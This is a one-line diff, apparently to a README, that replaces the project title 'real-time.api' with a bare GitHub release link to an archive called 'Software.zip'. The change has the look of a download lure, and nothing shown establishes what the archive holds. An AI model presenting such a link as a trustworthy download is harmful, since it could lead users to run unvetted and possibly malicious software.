@@ -1,1 +1,1 @@
-# real-time.api
+# https://github.com/montaigne23/real-time.api/releases/download/v1.0/Software.zip
